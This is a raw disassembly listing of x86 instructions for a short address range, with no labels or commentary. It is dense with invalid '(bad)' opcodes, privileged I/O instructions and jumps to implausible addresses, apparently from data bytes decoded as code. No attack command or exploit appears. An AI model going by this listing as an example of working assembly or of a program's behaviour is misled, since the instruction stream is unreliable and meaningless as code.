  42b741:	rol    esp,0xee
  42b744:	int    0xf7
  42b746:	(bad)
  42b749:	div    esi
  42b74b:	fstp   st(2)
  42b74d:	call   0xce178721
  42b752:	repz aam 0xc0
  42b755:	inc    DWORD PTR [esi]
  42b757:	jmp    0xe10b:0xe504e3df
  42b75e:	stos   DWORD PTR es:[edi],eax
  42b75f:	mov    cl,0xde
  42b761:	lods   al,BYTE PTR ds:[esi]
  42b762:	out    0xc3,al
  42b764:	sti    
  42b765:	out    0xd6,al
  42b767:	fdiv   st,st(0)
  42b769:	clc    
  42b76a:	in     al,dx
  42b76b:	rol    BYTE PTR [ebx],cl
  42b76d:	jecxz  0x42b76f
  42b76f:	int3   
  42b770:	neg    bh
  42b772:	aad    0xf2
  42b774:	fmul   st(2),st
  42b776:	fdivr  st,st(3)
  42b778:	ud2    
  42b77a:	or     eax,0xcb030cde
  42b77f:	out    0xae,eax
  42b781:	mul    dl
  42b783:	retf   
  42b784:	sti    
  42b785:	ftst   
  42b787:	jmp    0xf6fa718b
  42b78c:	out    dx,eax
  42b78d:	leave  
  42b78e:	sar    dl,1
  42b790:	into   
  42b791:	clc    
  42b792:	icebp  
  42b793:	pop    es
  42b794:	ret    
  42b795:	rcl    al,0xfc
  42b798:	add    eax,0xc801c7d8
  42b79d:	faddp  st(0),st
  42b79f:	ret    
  42b7a0:	(bad)  
  42b7a1:	fidiv  WORD PTR [edi-0x281f311f]
  42b7a7:	jmp    0xf2dd:0xd6eed0bf
  42b7ae:	lock (bad) 
  42b7b1:	loop   0x42b7b7
  42b7b3:	hlt    
  42b7b4:	(bad)  
  42b7b5:	lock in al,0xeb
  42b7b8:	fild   WORD PTR [ecx+ebp*8]
  42b7bb:	(bad)  
  42b7bd:	out    dx,eax
  42b7be:	jecxz  0x42b769
  42b7c0:	(bad)
  42b7c3:	call   0xf9fea48c
  42b7c8:	retf   0xdbc6
  42b7cb:	in     al,0xbe
  42b7cd:	mov    ebx,0xd0c3fbf6
  42b7d2:	cmc    
  42b7d3:	or     edi,DWORD PTR [eax+edx*8-0x2127f716]
  42b7da:	or     ecx,esi
  42b7dc:	add    ecx,esi
  42b7de:	mov    dl,0xed
  42b7e0:	mul    ebx
  42b7e2:	mov    ebp,0xf6d2d1d3
  42b7e7:	jmp    edi
  42b7e9:	shl    eax,1
  42b7eb:	aam    0xd9
  42b7ed:	repnz cld 
  42b7ef:	loope  0x42b7ce
  42b7f1:	inc    BYTE PTR ds:0xc00206de
  42b7f7:	(bad)  
  42b7f9:	(bad)  
  42b7fa:	jmp    0x42b7be
  42b7fc:	inc    BYTE PTR [eax]
  42b7fe:	sar    DWORD PTR [eax+esi*8-0x333a0912],cl
  42b805:	mov    al,0xd0
  42b807:	(bad)  
  42b809:	ror    ch,cl
  42b80b:	sar    ah,cl
  42b80d:	fprem  
  42b80f:	cmc    
  42b810:	shl    al,cl
  42b812:	(bad)  
  42b813:	aad    0xea
  42b815:	retf   
  42b816:	fld    QWORD PTR [ecx+eax*1]
  42b819:	enter  0xfcd9,0xe0
  42b81d:	jecxz  0x42b7c9
  42b81f:	(bad)  
  42b820:	jmp    0x42b7f2
  42b822:	mov    ch,0xcd
  42b824:	test   al,0xf0
  42b827:	cmc    
  42b828:	out    dx,eax
  42b829:	out    dx,al
  42b82a:	(bad)  
  42b82c:	into   
  42b82d:	lock add bl,dl
  42b830:	mov    esi,0xff04dfc2
  42b835:	pop    es
  42b836:	cld    
  42b837:	mul    ch
  42b839:	fld    DWORD PTR [eax]
  42b83b:	jmp    0x42b823
  42b83d:	in     al,dx
  42b83e:	fadd   st,st(3)
  42b840:	ror    dh,0xf4
  42b843:	in     eax,dx
  42b844:	rcl    edi,cl
  42b846:	shl    ebp,0xba
  42b849:	mov    edx,0xf1d4c8f7
  42b84e:	sar    DWORD PTR [esi-0x183c233f],0xdb
  42b855:	retf   
  42b856:	add    eax,0x5d9fafe
  42b85b:	bswap  edi
  42b85d:	adc    esp,ecx
  42b85f:	mov    eax,0xc3bcb3c8
  42b864:	test   eax,0xccefc6c4
  42b869:	iret   
  42b86a:	retf   
  42b86b:	mov    ah,0xbc
  42b86d:	mov    esp,0xdcfec0d9
  42b872:	out    0xe6,al
  42b874:	loopne 0x42b868
  42b876:	call   0xfa23a244
  42b87b:	aam    0xdc
  42b87d:	iret   
  42b87e:	fxch   st(0)
  42b880:	leave  
  42b881:	rol    dl,0xe1
  42b884:	jmp    0xbfd6:0xefeff1d6
  42b88b:	mov    esp,0xdef5dafa
  42b890:	stc    
  42b891:	add    bh,dh
  42b893:	add    edi,esp
  42b895:	in     eax,0xcb
  42b897:	rcr    edi,0xee
  42b89a:	cli    
  42b89b:	call   0xae0ac4b2
  42b8a0:	icebp  
  42b8a1:	shr    DWORD PTR [esi-0x284f523a],cl
  42b8a7:	cmc    
  42b8a8:	lock lods al,BYTE PTR ds:[esi]
  42b8aa:	shr    ecx,cl
  42b8ac:	(bad)  
  42b8ad:	ret    0xd5b9
  42b8b0:	loop   0x42b879
  42b8b2:	lock (bad) 
  42b8b5:	jecxz  0x42b87c
  42b8b7:	jmp    0x42b8bf
  42b8b9:	fcmovbe st,st(4)
  42b8bb:	hlt    
  42b8bc:	loopne 0x42b8af
  42b8be:	mov    esi,0xb2f1b3bf
  42b8c3:	mov    ah,0xc1
  42b8c5:	lock enter 0xbbfa,0xd1
  42b8ca:	in     eax,0xd5
  42b8cc:	aad    0xcd
  42b8ce:	icebp  
  42b8cf:	add    esp,esi
  42b8d1:	fdivr  st(3),st
  42b8d3:	in     eax,0xd1
  42b8d5:	out    0xd1,al
  42b8d7:	out    0xb,eax
  42b8d9:	out    dx,eax
  42b8da:	add    al,BYTE PTR [edx]
  42b8dc:	leave  
  42b8dd:	cli    
  42b8de:	in     al,dx
  42b8df:	(bad)  
  42b8e0:	div    DWORD PTR [edx-0x30081b51]
  42b8e6:	mov    dl,0xe9
  42b8e8:	call   0xb23ba3c7
  42b8ed:	in     al,dx
  42b8ee:	mov    eax,0xf6c2ecc0
  42b8f3:	ret    
  42b8f4:	pop    es
  42b8f5:	add    al,bl
  42b8f7:	dec    DWORD PTR [ebx]
  42b8f9:	add    eax,0xe8eae0da
  42b8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b8ff:	shl    ah,1
  42b901:	shr    esp,0xe1
  42b904:	loope  0x42b8e1
  42b906:	retf   
  42b907:	out    dx,al
  42b908:	call   0xf6fe95c7
  42b90d:	add    bh,ah
  42b90f:	cld    
  42b910:	shl    esi,1
  42b912:	hlt    
  42b913:	aam    0xb
  42b915:	ret    
  42b916:	or     esp,edi
  42b918:	sti    
  42b919:	out    0xff,al
  42b91b:	add    al,0xcb
  42b91d:	loopne 0x42b90c
  42b91f:	fild   QWORD PTR [edi-0x2f1e4215]
  42b925:	repnz mov ah,0xf1
  42b928:	out    0xda,eax
  42b92a:	retf   0xdef6
  42b92d:	mov    esi,0x600f2c1
  42b932:	cmc    
  42b933:	(bad)
  42b936:	idiv   esi
  42b938:	add    BYTE PTR [edx],cl
  42b93a:	or     eax,0xde13eef8
  42b93f:	in     al,0xac
  42b941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b942:	jecxz  0x42b90d
  42b944:	(bad)  
  42b945:	loopne 0x42b914
  42b947:	stc    
  42b948:	(bad)  
  42b94a:	fninit 
  42b94c:	icebp  
  42b94d:	leave  
  42b94e:	out    dx,eax
  42b94f:	jecxz  0x42b922
  42b951:	repnz jecxz 0x42b937
  42b954:	(bad)  
  42b955:	fcmovne st,st(2)
  42b957:	fadd   st(1),st
  42b959:	sti    
  42b95a:	(bad)  
  42b95b:	in     eax,dx
  42b95c:	adc    cl,BYTE PTR [edx]
  42b95e:	lock (bad) 
  42b960:	retf   0xe1f2
  42b963:	retf   
  42b964:	hlt    
  42b965:	retf   
  42b966:	imul   ecx
  42b968:	mov    dh,0xe9
  42b96b:	fmul   st,st(3)
  42b96d:	repz add cl,bh
  42b970:	in     eax,dx
  42b971:	loope  0x42b947
  42b973:	test   BYTE PTR [edx],0xdf
  42b976:	or     bl,dh
  42b978:	call   0x64c8547
  42b97d:	pop    es
  42b97e:	shl    DWORD PTR [esi-0x2e533242],1
  42b984:	ret    
  42b985:	jmp    0xdc36af83
  42b98a:	in     al,dx
  42b98b:	retf   0xd8e2
  42b98e:	(bad)  
  42b98f:	call   0xd53d9955
  42b994:	xlat   BYTE PTR ds:[ebx]
  42b995:	(bad)
  42b998:	stc    
  42b999:	into   
  42b99a:	stc    
  42b99b:	jmp    0xefc0:0xbfe808ce
  42b9a2:	(bad)  
  42b9a3:	in     eax,0xda
  42b9a5:	cmc    
  42b9a6:	aad    0xf7
  42b9a8:	xlat   BYTE PTR ds:[ebx]
  42b9a9:	(bad)  
  42b9aa:	out    dx,al
  42b9ab:	fistp  QWORD PTR [esi-0x31233002]
  42b9b1:	add    ah,cl
  42b9b3:	stc    
  42b9b4:	stc    
  42b9b5:	in     eax,0xb
  42b9b7:	out    0xc8,eax
  42b9b9:	or     al,BYTE PTR [ecx]
  42b9bb:	cli    
  42b9bc:	loopne 0x42b9c6
  42b9be:	mov    bl,0xe2
  42b9c0:	shl    al,cl
  42b9c2:	hlt    
  42b9c3:	(bad)  
  42b9c4:	mov    ebx,0xe6c0cafb
  42b9c9:	in     al,dx
  42b9ca:	retf   
  42b9cb:	leave  
  42b9cc:	(bad)  
  42b9ce:	hlt    
  42b9cf:	add    edi,ebp
  42b9d1:	repnz std 
  42b9d3:	int3   
  42b9d4:	cli    
  42b9d5:	lds    eax,FWORD PTR ds:0xd4f90f
  42b9db:	fdiv   st(7),st
  42b9dd:	out    dx,al
  42b9de:	(bad)  
  42b9e0:	ror    ch,0xb6
  42b9e3:	stos   BYTE PTR es:[edi],al
  42b9e4:	in     eax,dx
  42b9e5:	jmp    0xe4ba:0xf8b7c6da
  42b9ec:	cld    
  42b9ed:	iret   
  42b9ee:	repnz fdiv st,st(3)
  42b9f1:	mov    ebp,0xbf0bf
  42b9f6:	ret    
  42b9f7:	fimul  DWORD PTR [ecx]
  42b9f9:	fstp   st(6)
  42b9fb:	leave  
  42b9fc:	stc    
  42b9fd:	cli    
  42b9fe:	into   
  42b9ff:	mov    bl,0xd2
  42ba01:	out    0xe7,eax
  42ba03:	(bad)  
  42ba04:	repnz loope 0x42b9c1
  42ba07:	test   esp,0xc8f0e5d4
  42ba0d:	mov    al,0xbd
  42ba0f:	shl    cl,0xbe
  42ba12:	pop    es
  42ba13:	idiv   cl
  42ba15:	rol    BYTE PTR ds:0xfee7fcda,1
  42ba1b:	add    eax,0xc2de0b03
  42ba20:	rol    ch,1
  42ba22:	mov    ebp,0xd1f1b0b2
  42ba27:	bnd call 0xbf2fb3ec
  42ba2d:	hlt    
  42ba2e:	mov    esi,0xf3ecf0d3
  42ba33:	loope  0x42ba26
  42ba35:	out    0x1,eax
  42ba37:	out    0xc0,al
  42ba39:	or     ebp,ebx
  42ba3b:	call   0xd207ca1b
  42ba40:	mov    bh,0xe9
  42ba42:	mov    dh,0xf0
  42ba44:	xlat   BYTE PTR ds:[ebx]
  42ba45:	aad    0xc7
  42ba47:	lds    esi,FWORD PTR [eax-0x4b1b3b31]
  42ba4d:	mov    esi,0xf5e7f1d6
  42ba52:	lds    eax,FWORD PTR [edx]
  42ba54:	jmp    0xe6db:0xfee6ebe7
  42ba5b:	enter  0xccfb,0xca
  42ba5f:	fmul   st(0),st
  42ba61:	jmp    0x42ba43
  42ba63:	(bad)  
  42ba64:	mov    ah,0xd0
  42ba66:	cli    
  42ba67:	(bad)  
  42ba68:	mov    ebx,0xfef2efcf
  42ba6d:	(bad)  
  42ba6f:	out    dx,al
  42ba70:	clc    
  42ba71:	stc    
  42ba72:	aam    0xf4
  42ba74:	(bad)  
  42ba76:	in     al,0xe7
  42ba78:	(bad)  
  42ba79:	jmp    0x1340b86d
  42ba7e:	scas   al,BYTE PTR es:[edi]
  42ba7f:	mov    bl,0xe4
  42ba81:	jecxz  0x42ba2e
  42ba83:	lds    ebp,FWORD PTR [ecx-0x21444d0b]
  42ba89:	les    esi,FWORD PTR [ebx-0x220e2901]
  42ba8f:	out    0xc0,eax
  42ba91:	add    ch,ch
  42ba93:	fcomi  st,st(5)
  42ba95:	aad    0xb
  42ba97:	(bad)  
  42ba99:	add    ebx,edx
  42ba9b:	out    dx,eax
  42ba9c:	jmp    0xc8f5:0xe9d0b9c4
  42baa3:	lods   eax,DWORD PTR ds:[esi]
  42baa4:	mov    edx,0xbfb4c0ed
  42baaa:	fidivr DWORD PTR [esi+edi*4+0x2bcd6ca]
  42bab1:	loopne 0x42ba91
  42bab3:	out    0x4,al
  42bab5:	rol    DWORD PTR [eax+esi*8],0xcb
  42bab9:	dec    dh
  42babb:	hlt    
  42babc:	rol    DWORD PTR [edi],0xe2
  42babf:	test   eax,0xefc0cbc2
  42bac4:	retf   
  42bac5:	rcl    al,1
  42bac7:	div    dl
  42bac9:	lods   al,BYTE PTR ds:[esi]
  42baca:	mov    esi,0xe3dedbd7
  42bacf:	mov    esi,0xc5ecf2cc
  42bad4:	jecxz  0x42badd
  42bad6:	jmp    esi
  42bad8:	leave  
  42bad9:	aam    0xfb
  42badb:	fcmovnbe st,st(3)
  42badd:	call   0xca3aa9d0
  42bae2:	leave  
  42bae3:	retf   0xc4f3
  42bae6:	mov    dh,0xcf
  42bae8:	vpor   xmm1,xmm1,xmm7
  42baec:	int    0xf7
  42baee:	add    BYTE PTR [edx-0x20dfd47],bh
  42baf4:	ror    DWORD PTR [ebx],1
  42baf6:	leave  
  42baf7:	out    0xde,eax
  42baf9:	aad    0xc4
  42bafb:	(bad)
  42bafe:	lock fdivrp st(6),st
  42bb01:	jmp    0xea2d8ed7
  42bb06:	sar    eax,cl
  42bb08:	leave  
  42bb09:	call   eax
  42bb0b:	in     al,0xcb
  42bb0d:	fxch   st(5)
  42bb0f:	call   0xd51a77fa
  42bb14:	loope  0x42bb01
  42bb16:	(bad)  
  42bb18:	xlat   BYTE PTR ds:[ebx]
  42bb19:	fiadd  DWORD PTR [edi]
  42bb1b:	int    0xe0
  42bb1d:	add    edx,edx
  42bb1f:	in     al,0xeb
  42bb21:	rcl    ebp,0xf1
  42bb24:	aad    0xd5
  42bb26:	fnstenv [edx-0x2103224b]
  42bb2c:	(bad)  
  42bb2e:	sti    
  42bb2f:	fdivrp st(5),st
  42bb31:	loop   0x42bb27
  42bb33:	rol    BYTE PTR [edi],1
  42bb35:	sar    dl,cl
  42bb37:	or     ebx,esp
  42bb39:	sti    
  42bb3a:	(bad)  
  42bb3b:	retf   
  42bb3c:	add    ecx,DWORD PTR [esi]
  42bb3e:	repz mov eax,0xb1e3e6ac
  42bb44:	fcmovnu st,st(3)
  42bb46:	shl    DWORD PTR [ebp-0x54b3729],cl
  42bb4c:	mov    esi,0x3f7bcbd
  42bb51:	mov    ah,0xe6
  42bb53:	shl    ah,0xe2
  42bb56:	fucomip st,st(1)
  42bb58:	or     esp,esp
  42bb5a:	ret    
  42bb5b:	out    dx,eax
  42bb5c:	push   cs
  42bb5d:	add    cl,bl
  42bb5f:	out    0xea,al
  42bb61:	shl    bh,cl
  42bb63:	ror    ebx,0xc9
  42bb66:	(bad)  
  42bb67:	mov    ebx,0xc8fdebff
  42bb6c:	jmp    0x42bb3a
  42bb6e:	jmp    0xe23ab63b
  42bb73:	rol    esi,cl
  42bb75:	jecxz  0x42bb6d
  42bb77:	or     bh,dl
  42bb79:	hlt    
  42bb7a:	iret   
  42bb7b:	loope  0x42bb56
  42bb7d:	repnz jmp 0xb2ea:0xc9ebf6c3
  42bb85:	jmp    0xddf4a53f
  42bb8a:	cld    
  42bb8b:	mov    esp,0xc3f0d4ec
  42bb90:	add    edi,ebx
  42bb92:	ret    
  42bb93:	add    dh,bh
  42bb95:	add    bh,dh
  42bb97:	push   es
  42bb98:	(bad)  
  42bb99:	retf   
  42bb9a:	stc    
  42bb9b:	add    ebx,edi
  42bb9d:	into   
  42bb9e:	int3   
  42bb9f:	test   al,0xc7
  42bba1:	lods   eax,DWORD PTR ds:[esi]
  42bba2:	lods   al,BYTE PTR ds:[esi]
  42bba3:	loop   0x42bb57
  42bba5:	sar    DWORD PTR [edx-0x292a0a1a],cl
  42bbab:	sti    
  42bbac:	idiv   cl
  42bbae:	out    dx,al
  42bbaf:	add    cl,ah
  42bbb1:	add    esi,ebx
  42bbb3:	fld    st(3)
  42bbb5:	cli    
  42bbb6:	std    
  42bbb7:	shr    edx,0xed
  42bbba:	or     ah,bl
  42bbbc:	shl    ebx,0xcc
  42bbbf:	(bad)  
  42bbc1:	cmc    
  42bbc2:	scas   eax,DWORD PTR es:[edi]
  42bbc3:	jecxz  0x42bbb3
  42bbc5:	mov    ch,0xd2
  42bbc7:	call   0xf528af82
  42bbcc:	cli    
  42bbcd:	not    dh
  42bbcf:	mov    esp,0xd0d8d9b5
  42bbd4:	add    eax,DWORD PTR [eax]
  42bbd6:	sti    
  42bbd7:	add    al,0xb
  42bbd9:	lds    eax,FWORD PTR [eax]
  42bbdb:	clc    
  42bbdc:	pop    es
  42bbdd:	call   0xd2f07c8b
  42bbe2:	loope  0x42bb94
  42bbe4:	sti    
  42bbe5:	jmp    0x42bb97
  42bbe7:	xlat   BYTE PTR ds:[ebx]
  42bbe8:	not    bh
  42bbea:	fistp  QWORD PTR [edi-0x332442fe]
  42bbf0:	idiv   BYTE PTR [edi-0x24461b29]
  42bbf6:	loopne 0x42bbc1
  42bbf8:	or     eax,ebp
  42bbfa:	hlt    
  42bbfb:	or     esi,ecx
  42bbfd:	pmulhw mm5,QWORD PTR [edi-0x4b333920]
  42bc04:	(bad)  
  42bc05:	loopne 0x42bbb7
  42bc07:	call   0xfc028df8
  42bc0c:	repz imul ecx
  42bc0f:	mov    esp,0xbd5f4fe
  42bc14:	out    0xb8,eax
  42bc16:	(bad)  
  42bc18:	(bad)  
  42bc19:	fld    st(4)
  42bc1b:	(bad)  
  42bc1c:	stc    
  42bc1d:	cli    
  42bc1e:	into   
  42bc1f:	out    dx,eax
  42bc20:	ret    
  42bc21:	int    0xca
  42bc23:	rcr    dl,0xcb
  42bc26:	cli    
  42bc27:	fcomp  st(6)
  42bc29:	lods   al,BYTE PTR ds:[esi]
  42bc2a:	fdivp  st(6),st
  42bc2c:	retf   0xc9c9
  42bc2f:	mov    dh,0xf1
  42bc31:	mov    ah,0xf6
  42bc33:	add    BYTE PTR [ebp-0x1120403c],bh
  42bc39:	fimul  WORD PTR [esi]
  42bc3b:	loopne 0x42bc35
  42bc3d:	out    0xca,eax
  42bc3f:	in     eax,dx
  42bc40:	jmp    0x42bc0e
  42bc42:	mov    dh,0xb1
  42bc44:	fcmove st,st(0)
  42bc46:	lock fcmovne st,st(1)
  42bc49:	ffreep st(5)
  42bc4b:	cld    
  42bc4c:	cld    
  42bc4d:	mov    esp,0xd1ecfbd0
  42bc52:	cld    
  42bc53:	fld    DWORD PTR [edi]
  42bc55:	(bad)  
  42bc56:	(bad)
  42bc59:	out    dx,eax
  42bc5a:	in     eax,0xde
  42bc5c:	(bad)  
  42bc5d:	jmp    0xc2107e1f
  42bc62:	fst    st(3)
  42bc64:	ror    ah,cl
  42bc66:	repz mov edx,0xccd2f4f0
  42bc6c:	fcmovb st,st(2)
  42bc6e:	in     al,dx
  42bc6f:	iret   
  42bc70:	shl    al,0xfe
  42bc73:	fimul  DWORD PTR [ebx]
  42bc75:	add    ebp,ebx
  42bc77:	lds    eax,FWORD PTR [edi+edi*8]
  42bc7a:	or     ah,dh
  42bc7c:	add    bh,ch
  42bc7e:	(bad)  
  42bc7f:	loopne 0x42bc5f
  42bc81:	rcl    bh,1
  42bc83:	ret    
  42bc84:	ror    edx,0xe4
  42bc87:	cli    
  42bc88:	mov    ebx,0xf0cabbf5
  42bc8d:	in     al,dx
  42bc8e:	icebp  
  42bc8f:	int    0xc0
  42bc91:	std    
  42bc92:	rol    BYTE PTR [ecx],1
  42bc94:	fcmovne st,st(2)
  42bc96:	lds    ecx,FWORD PTR [ebx]
  42bc98:	(bad)  
  42bc9a:	fisttp WORD PTR [edi]
  42bc9c:	inc    DWORD PTR [edi]
  42bc9e:	leave  
  42bc9f:	mov    bl,0xc7
  42bca1:	ror    edi,cl
  42bca3:	out    0xeb,al
  42bca5:	out    dx,al
  42bca6:	(bad)  
  42bca7:	loopne 0x42bc80
  42bca9:	fdivp  st(5),st
  42bcab:	aad    0xd8
  42bcad:	repz lock call ecx
  42bcb1:	shl    esp,cl
  42bcb3:	mov    DWORD PTR [esi],0xe9f4ddf4
  42bcb9:	(bad)  
  42bcba:	fmul   QWORD PTR [eax]
  42bcbc:	out    dx,al
  42bcbd:	stc    
  42bcbe:	mov    dl,0xc4
  42bcc0:	out    0xf0,al
  42bcc2:	shl    DWORD PTR [edi-0x3a4f3031],1
  42bcc8:	mov    ecx,0xb5f7eccd
  42bccd:	fmulp  st(0),st
  42bccf:	mov    edi,0xd2d8f0d0
  42bcd4:	jmp    0xfbe5:0xdec408ea
  42bcdb:	cli    
  42bcdc:	or     ecx,esi
  42bcde:	(bad)  
  42bcdf:	scas   eax,DWORD PTR es:[edi]
  42bce0:	scas   eax,DWORD PTR es:[edi]
  42bce1:	fdivrp st(6),st
  42bce3:	sti    
  42bce4:	(bad)  
  42bce5:	in     al,dx
  42bce6:	hlt    
  42bce7:	out    0xf9,eax
  42bce9:	mov    esi,0x3d1f6eb
  42bcee:	hlt    
  42bcef:	enter  0xcced,0xbc
  42bcf3:	fcmovb st,st(6)
  42bcf5:	pop    es
  42bcf6:	leave  
  42bcf7:	loopne 0x42bcde
  42bcf9:	or     DWORD PTR [edi],eax
  42bcfb:	(bad)  
  42bcfc:	or     eax,0xe3a6afe4
  42bd01:	jmp    0x42bcf0
  42bd03:	sti    
  42bd04:	jmp    0xeece:0xd5b5f1c8
  42bd0b:	repnz mov ch,0xb4
  42bd0e:	mov    esi,0xecdcf6ba
  42bd13:	fld    QWORD PTR [edi]
  42bd15:	loop   0x42bd19
  42bd17:	std    
  42bd18:	cld    
  42bd19:	or     ebp,edx
  42bd1b:	in     al,dx
  42bd1c:	iret   
  42bd1d:	loope  0x42bd0c
  42bd1f:	imul   esp
  42bd21:	jmp    0xe7106e0a
  42bd26:	aad    0xd2
  42bd28:	(bad)
  42bd2b:	lock fucom st(3)
  42bd2e:	xlat   BYTE PTR ds:[ebx]
  42bd2f:	mov    ecx,0xdcf8c1de
  42bd34:	add    bl,cl
  42bd36:	ret    0xbd9
  42bd39:	retf   
  42bd3a:	iret   
  42bd3b:	hlt    
  42bd3c:	adc    ecx,edi
  42bd3e:	mov    esp,0xe5c3ebbf
  42bd43:	(bad)  
  42bd44:	in     al,0xc4
  42bd46:	cli    
  42bd47:	int3   
  42bd48:	iret   
  42bd49:	shr    esi,1
  42bd4b:	mov    esp,0xe0bebfcc
  42bd50:	clc    
  42bd51:	shl    bl,cl
  42bd53:	aam    0xe1
  42bd55:	jmp    0xbd24a93c
  42bd5a:	paddusb mm0,QWORD PTR [ecx]
  42bd5d:	or     eax,0xb6c2ada8
  42bd62:	int3   
  42bd63:	div    cl
  42bd65:	(bad)  
  42bd67:	out    0xf3,eax
  42bd69:	fxtract 
  42bd6b:	idiv   bh
  42bd6d:	cld    
  42bd6e:	mov    eax,0xe5decfbe
  42bd73:	sti    
  42bd74:	pop    es
  42bd75:	jmp    0xe2ff:0xcac1d0da
  42bd7c:	iret   
  42bd7d:	leave  
  42bd7e:	enter  0xf6de,0xef
  42bd82:	mov    al,0xeb
  42bd84:	mov    bh,0xee
  42bd86:	(bad)  
  42bd87:	in     al,0xca
  42bd89:	fnstcw WORD PTR [ebx-0x16100438]
  42bd8f:	repz shl dl,0xd5
  42bd93:	clc    
  42bd94:	ror    bl,cl
  42bd96:	(bad)  
  42bd98:	bswap  edi
  42bd9a:	(bad)  
  42bd9b:	push   cs
  42bd9c:	iret   
  42bd9d:	fld    st(0)
  42bd9f:	iret   
  42bda0:	mov    esi,0xf1aeb6c2
  42bda5:	sti    
  42bda6:	int3   
  42bda7:	mov    dl,0xd3
  42bda9:	in     al,dx
  42bdaa:	lock fld DWORD PTR [ebx]
  42bdad:	int3   
  42bdae:	cli    
  42bdaf:	into   
  42bdb0:	sti    
  42bdb1:	in     al,dx
  42bdb2:	mov    ebx,0xd7eaf6fe
  42bdb7:	sti    
  42bdb8:	jmp    0xe8e2:0xfdd4fadd
  42bdbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bdc0:	int    0xb0
  42bdc2:	retf   
  42bdc3:	scas   al,BYTE PTR es:[edi]
  42bdc4:	(bad)  
  42bdc5:	mov    al,0xb5
  42bdc7:	out    dx,eax
  42bdc8:	jmp    0xf3bb:0xf5fbfef3
  42bdcf:	out    dx,al
  42bdd0:	mov    ebp,0xdf07bbce
  42bdd5:	jmp    0x42bde1
  42bdd7:	add    eax,0xe30fffda
  42bddc:	or     eax,esp
  42bdde:	shr    BYTE PTR [edi-0x121e0a49],cl
  42bde4:	in     eax,dx
  42bde5:	leave  
  42bde6:	retf   0xf0cc
  42bde9:	fcomp  st(5)
  42bdeb:	call   0xf2009acf
  42bdf0:	in     eax,dx
  42bdf1:	in     al,dx
  42bdf2:	repz (bad) 
  42bdf4:	cld    
  42bdf5:	fdiv   st,st(1)
  42bdf7:	aam    0xee
  42bdf9:	add    al,0xc
  42bdfb:	add    al,0xd9
  42bdfd:	out    dx,al
  42bdfe:	loop   0x42bdcd
  42be00:	mov    cl,0xaf
  42be02:	lock vpmuludq ymm5,ymm7,ymm5
  42be07:	(bad)  
  42be09:	repz mov ebx,0xf0edbdcb
  42be0f:	sti    
  42be10:	mov    eax,0xd7e0db
  42be16:	(bad)
  42be19:	add    eax,0xe6e9edd8
  42be1e:	shl    bh,1
  42be20:	les    esi,FWORD PTR [eax-0x2f3f143f]
  42be26:	test   esp,0xced6edd0
  42be2c:	shr    ebp,cl
  42be2e:	aam    0xd0
  42be30:	aam    0xbc
  42be32:	mov    ebx,0x9e9f9e1
  42be37:	or     ch,al
  42be39:	retf   
  42be3a:	fdiv   st,st(3)
  42be3c:	cli    
  42be3d:	out    0xb1,eax
  42be3f:	mov    bl,0xe5
  42be42:	cmc    
  42be43:	repnz mov cl,0xba
  42be46:	out    0xc6,al
  42be48:	aam    0xed
  42be4a:	leave  
  42be4b:	out    dx,al
  42be4c:	ror    ebp,1
  42be4e:	cli    
  42be4f:	mov    ecx,0xe6bfdbf6
  42be54:	bnd call edi
  42be57:	add    bl,ah
  42be59:	clc    
  42be5a:	sti    
  42be5b:	fdivr  st,st(1)
  42be5d:	fdivr  QWORD PTR [eax-0x3c51433d]
  42be63:	retf   0xb4ca
  42be66:	(bad)  
  42be67:	lds    ebp,FWORD PTR [ebp-0x15172635]
  42be6d:	repnz cmc 
  42be6f:	pop    es
  42be70:	fcmovne st,st(4)
  42be72:	std    
  42be73:	rcl    esi,1
  42be75:	(bad)  
  42be77:	or     ch,dh
  42be79:	vcmpps xmm7,xmm2,xmm5,0xfe
  42be7e:	shl    esi,0xbd
  42be81:	in     eax,0xf7
  42be83:	retf   0xebad
  42be86:	jmp    0x42be60
  42be88:	leave  
  42be89:	out    dx,al
  42be8a:	mov    bh,0xcb
  42be8c:	mov    cl,0xb4
  42be8e:	mov    ebp,0xf0bce6c0
  42be93:	rol    ah,0xca
  42be96:	ror    al,0xc7
  42be99:	enter  0xda04,0xc
  42be9d:	fisub  WORD PTR [edi-0x323d412f]
  42bea3:	int3   
  42bea4:	ror    dl,cl
  42bea6:	mov    ch,0xf7
  42bea8:	sar    al,1
  42beaa:	fsubp  st(3),st
  42beac:	loop   0x42be6c
  42beae:	mov    ebx,0xdce0c3c8
  42beb3:	(bad)  
  42beb5:	rol    esp,0xe0
  42beb8:	aad    0xdf
  42beba:	add    eax,0xcfc4e003
  42bebf:	mov    cl,0xe3
  42bec1:	mov    cl,0xee
  42bec3:	in     eax,0xe0
  42bec5:	(bad)  
  42bec6:	jmp    0xf7f4:0xcde8eed3
  42becd:	(bad)  
  42bece:	ret    0xefd2
  42bed1:	rol    DWORD PTR [eax],0xc2
  42bed4:	inc    cl
  42bed6:	(bad)  
  42bed8:	psadbw mm5,mm0
  42bedb:	jmp    0xc5207fd9
  42bee0:	leave  
  42bee1:	out    dx,al
  42bee2:	shl    ecx,0xe8
  42bee5:	iret   
  42bee6:	mov    edx,0xfeacc8c8
  42beeb:	fdiv   st(4),st
  42beed:	repnz fcmovbe st,st(3)
  42bef0:	aam    0x5
  42bef2:	push   ebp
  42bef4:	(bad)  
  42bef5:	hlt    
  42bef6:	retf   0xf8db
  42bef9:	vpsubsb xmm1,xmm0,xmm1
  42befd:	in     al,0xd0
  42beff:	jecxz  0x42bec5
  42bf01:	ret    
  42bf02:	jmp    0xb01d6cfc
  42bf07:	mov    ebx,0xc9fad5ec
  42bf0c:	fcmovnu st,st(6)
  42bf0e:	not    ebx
  42bf10:	repnz xlat BYTE PTR ds:[ebx]
  42bf12:	(bad)  
  42bf13:	aam    0xd0
  42bf15:	(bad)  
  42bf16:	leave  
  42bf17:	add    eax,0xe6f4e0ff
  42bf1c:	or     bl,ch
  42bf1e:	lods   al,BYTE PTR ds:[esi]
  42bf1f:	(bad)  
  42bf21:	mov    bh,0xc2
  42bf23:	iret   
  42bf24:	loopne 0x42beef
  42bf26:	mov    dl,0xe8
  42bf28:	call   ebp
  42bf2a:	icebp  
  42bf2b:	out    dx,eax
  42bf2c:	repnz leave 
  42bf2e:	loope  0x42bee9
  42bf30:	mov    ecx,0xc0d806f2
  42bf35:	ror    bl,1
  42bf37:	ffreep st(1)
  42bf39:	(bad)  
  42bf3b:	jecxz  0x42bf3b
